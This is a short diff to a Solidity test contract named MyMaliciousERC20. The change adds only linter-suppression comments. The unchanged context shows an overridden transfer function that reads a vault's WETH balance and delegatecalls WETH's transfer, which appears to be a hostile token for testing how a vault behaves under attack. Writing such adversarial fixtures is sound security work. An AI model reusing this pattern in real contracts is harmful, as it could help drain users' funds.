@@ -31,6 +31,7 @@ contract MyMaliciousERC20 is ERC20, Ownable {
     function transfer(address, uint256) public override returns (bool) {
         address collTokenAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //weth
         uint256 repayAmount = IERC20(collTokenAddr).balanceOf(_vaultAddr); //get balance
+        // solhint-disable avoid-low-level-calls
         (bool success, bytes memory result) = collTokenAddr.delegatecall(
             abi.encodeWithSelector(
                 bytes4(keccak256("transfer(address,uint256)")),
@@ -39,6 +40,7 @@ contract MyMaliciousERC20 is ERC20, Ownable {
             )
         );
         if (!success) {
+            // solhint-disable no-inline-assembly
             assembly {
                 revert(add(result, 32), mload(result))
             }
